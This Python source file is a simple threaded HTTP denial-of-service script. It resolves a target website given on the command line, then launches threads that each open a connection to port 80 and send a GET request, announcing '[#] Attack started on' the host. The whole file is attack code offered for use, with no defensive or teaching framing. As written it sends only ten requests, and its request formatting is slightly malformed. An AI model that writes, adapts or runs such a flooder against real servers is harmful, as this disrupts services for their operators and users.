import socket
import string
import sys
import threading
import time

# Parse inputs
host = sys.argv[1]#input("Enter Host IP address: ")
ip = ""
port = 80
requests=10


# Convert FQDN to IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

def attack():
    url = '/'
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((ip, port))
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url, host)
        print(msg)
        byt = msg.encode()
        dos.send(byt)
    except socket.error:
        print ("\n [ No connection, server may be down ]: " + str(socket.error))
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print ("[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(requests))
try:
    all_threads = []
    for i in range(requests):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)
        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()
except:
    print("Goodbye!")
    sys.exit(0)
